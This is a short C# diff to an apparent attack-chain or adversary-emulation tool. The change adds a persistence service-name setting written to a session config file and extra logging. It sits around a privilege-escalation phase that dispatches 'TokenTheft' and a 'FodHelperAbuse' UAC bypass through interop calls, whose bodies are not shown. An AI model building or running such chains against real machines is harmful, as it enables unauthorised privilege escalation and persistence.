@@ -1,5 +1,9 @@
-﻿using Mabean.Interop;
+﻿using Mabean.Helpers;
+using Mabean.Interop;
 using Mabean.Models;
+using System;
+using System.IO;
+using System.Text.Json;
 using System.Threading.Tasks;
 
 namespace Mabean.Services;
@@ -15,6 +19,14 @@ public class ChainBehaviorService
 
     public async Task RunChainAsync(BehaviorChainDefinition chain)
     {
+        if (chain.Persistence is { } persistenceConfig)
+        {
+            var config = new { serviceName = persistenceConfig.ServiceName };
+            var json = JsonSerializer.Serialize(config);
+            await File.WriteAllTextAsync(Paths.SessionConfigPath, json);
+            LoggerService.Write($"[Chain] Session config written: {Paths.SessionConfigPath}");
+        }
+
         if (chain.PrivEsc is { } privEsc)
         {
             LoggerService.Write($"[Chain] Phase 1 - PrivEsc: {privEsc.Behavior}");
@@ -25,6 +37,7 @@ public class ChainBehaviorService
                     LoggerService.Write($"[Chain] TokenTheft result: {code1}");
                     break;
                 case "FodHelperAbuse":
+                    Console.WriteLine($"[Chain] FodHelperAbuse command: {privEsc.ExecPath}");
                     var code2 = InteropPrivilegeEscalation.FodHelperAbuseEscalation(privEsc.ExecPath);
                     LoggerService.Write($"[Chain] FodHelperAbuse result: {code2}");
                     break;
